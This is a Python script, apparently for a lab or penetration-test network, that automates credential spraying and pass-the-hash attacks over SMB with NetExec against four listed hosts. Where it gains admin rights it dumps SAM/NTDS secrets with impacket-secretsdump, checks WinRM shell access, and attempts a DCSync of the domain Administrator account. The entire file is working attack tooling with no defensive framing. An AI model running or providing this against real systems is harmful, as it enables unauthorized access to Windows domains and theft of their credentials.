import subprocess
import os

# Targets identified from your scan
targets = ["10.10.10.15", "10.10.10.25", "10.10.10.35", "10.10.10.225"]
creds_file = "creds.txt"

def run_nxc(proto, ip, user, secret, is_hash, local_auth=False):
    cmd = ["nxc", proto, ip, "-u", user]
    
    if is_hash:
        cmd += ["-H", secret]
    else:
        cmd += ["-p", secret]
        
    if local_auth:
        cmd.append("--local-auth")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if "[+]" in result.stdout:
            status = "PWN3D!" if "Pwn3d!" in result.stdout else "VALID"
            auth_type = "LOCAL" if local_auth else "DOMAIN"
            print(f"[\033[92m+\033[0m] {proto.upper()} - {ip} - {user}:{secret} ({status}) [{auth_type}]")
            return True, "Pwn3d!" in result.stdout
        else:
            if proto == "smb":
                print(f"[\033[91m-\033[0m] {proto.upper()} - {ip} - {user} (FAILED {'LOCAL' if local_auth else 'DOMAIN'})")
    except Exception as e:
        print(f"[!] Error: {e}")
    return False, False

def run_secrets_dump(ip, user, secret, is_hash, is_local=False):
    print(f"[*] Triggering SecretsDump on {ip}...")
    # Using ./ for local accounts ensures impacket doesn't try to look up the domain
    prefix = "./" if is_local else ""
    target_str = f"{prefix}{user}:{secret}@ {ip}"
    
    cmd = ["impacket-secretsdump", target_str]
    if is_hash:
        cmd.insert(1, "-hashes")
        cmd.insert(2, f"aad3b435b51404eeaad3b435b51404ee:{secret}")
    
    res = subprocess.run(cmd, capture_output=True, text=True)
    if "SAM" in res.stdout or "NTDS" in res.stdout:
        print(f"\033[92m[SUCCESS]\033[0m Dumped secrets from {ip}")
        with open(f"dump_{ip}.txt", "a") as f: f.write(res.stdout)

def main():
    print(f"[*] Starting spray across {len(targets)} targets...")
    if not os.path.exists(creds_file):
        print(f"[-] Missing {creds_file}"); return

    with open(creds_file, 'r') as f:
        credentials = [line.strip().split(':') for line in f if ":" in line.strip()]

    for user, secret in credentials:
        is_hash = len(secret) == 32
        for ip in targets:
            # 1. Try Domain Auth
            success, pwned = run_nxc("smb", ip, user, secret, is_hash, local_auth=False)
            is_local_success = False

            # 2. If Domain Auth fails, try Local Auth (Works for both password and hash now)
            if not success:
                success, pwned = run_nxc("smb", ip, user, secret, is_hash, local_auth=True)
                if success:
                    is_local_success = True

            if success:
                # If we have admin rights (Pwn3d!), dump secrets
                if pwned:
                    run_secrets_dump(ip, user, secret, is_hash, is_local=is_local_success)
                
                # Check for Shell access using the successful auth method
                run_nxc("winrm", ip, user, secret, is_hash, local_auth=is_local_success)

                # DC Specific: Test DCSync (Usually only works with Domain accounts)
                if ip == "10.10.10.225" and not is_local_success:
                    print(f"[*] Testing DCSync for {user} on DC...")
                    sd_cmd = ["impacket-secretsdump", f"{user}:{secret}@10.10.10.225", "-just-dc-user", "Administrator"]
                    if is_hash: 
                        sd_cmd.insert(1, "-hashes")
                        sd_cmd.insert(2, f"aad3b435b51404eeaad3b435b51404ee:{secret}")
                    sd_res = subprocess.run(sd_cmd, capture_output=True, text=True)
                    if "Administrator:" in sd_res.stdout:
                        print(f"\033[91m[!!!] DCSYNC SUCCESS: {user} is virtually Domain Admin!\033[0m")

if __name__ == "__main__":
    main()
